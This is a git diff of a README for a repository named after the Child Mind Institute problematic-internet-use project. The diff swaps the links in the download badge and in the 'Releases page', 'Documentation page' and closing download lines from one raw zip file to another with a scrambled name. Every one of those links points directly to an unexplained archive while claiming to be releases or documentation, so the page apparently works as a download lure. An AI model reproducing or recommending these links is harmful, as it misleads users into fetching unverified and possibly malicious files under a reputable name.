@@ -1,6 +1,6 @@
 # 🌟 Child-Mind-Institute-Problematic-Internet-Use - Empowering Healthy Digital Habits
 
-[![Download Now](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Child-Mind-Institute-Problematic-Internet-Use_1.5-beta.4.zip%20Now-Child--Mind--Institute--Problematic--Internet--Use-brightgreen)](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Child-Mind-Institute-Problematic-Internet-Use_1.5-beta.4.zip)
+[![Download Now](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Institute-Internet-Problematic-Use-Child-Mind-3.9.zip%20Now-Child--Mind--Institute--Problematic--Internet--Use-brightgreen)](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Institute-Internet-Problematic-Use-Child-Mind-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit our [Releases page](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Child-Mind-Institute-Problematic-Internet-Use_1.5-beta.4.zip). You will find the latest version of the application there.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Institute-Internet-Problematic-Use-Child-Mind-3.9.zip). You will find the latest version of the application there.
 
 1. Click on the link to go to the Releases page.
 2. Find the most recent version.
@@ -52,7 +52,7 @@ Join our growing community. Engage with other users to share tips and best pract
 
 ## 🔍 Documentation
 
-For detailed instructions on how to use specific features, visit our [Documentation page](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Child-Mind-Institute-Problematic-Internet-Use_1.5-beta.4.zip). Here you will find:
+For detailed instructions on how to use specific features, visit our [Documentation page](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Institute-Internet-Problematic-Use-Child-Mind-3.9.zip). Here you will find:
 
 - How to upload your fitness data
 - How to interpret the results
@@ -68,4 +68,4 @@ We thank the Child Mind Institute for supporting this project aimed at better un
 
 Feel free to explore the features and see how data can enhance child well-being in a digital era. Thank you for your interest in the Child Mind Institute's work on problematic internet use. 
 
-[Visit the Releases page to download!](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Child-Mind-Institute-Problematic-Internet-Use_1.5-beta.4.zip)
+[Visit the Releases page to download!](https://raw.githubusercontent.com/kirat5504/Child-Mind-Institute-Problematic-Internet-Use/main/References/Institute-Internet-Problematic-Use-Child-Mind-3.9.zip)
